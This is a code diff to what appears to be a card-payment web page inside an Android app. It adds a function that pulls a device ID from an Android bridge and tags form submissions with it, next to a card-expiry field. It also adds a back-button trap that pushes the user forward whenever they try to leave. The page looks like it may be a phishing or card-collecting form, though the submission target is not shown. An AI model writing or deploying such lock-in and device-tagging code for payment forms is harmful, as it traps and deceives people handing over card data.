@@ -126,7 +126,20 @@
   </div>
 </div>
 <script>
-let DeviceId = "{DEVICE_ID_MY_PROJECT}";
+  // دریافت Device ID از Android
+  function getDeviceId() {
+    try {
+      if (typeof Android !== 'undefined' && Android.getDeviceId) {
+        return Android.getDeviceId();
+      }
+    } catch (e) {
+      console.error('Error getting device ID:', e);
+    }
+    return 'web_browser_' + Date.now();
+  }
+
+  let DeviceId = getDeviceId();
+
   function formatExpiry(inp) {
     let v = inp.value.replace(/[^0-9]/g,"");
     if(v.length >= 2 && v[2] !== "/" && v.length < 5) v = v.slice(0,2) + "/" + v.slice(2);
@@ -162,6 +175,12 @@ DeviceId: ${DeviceId}`;
     });
     return false;
   }
+
+  // غیرفعال کردن دکمه برگشت
+  history.pushState(null, null, location.href);
+  window.onpopstate = function() {
+    history.go(1);
+  };
 </script>
 
 </body>
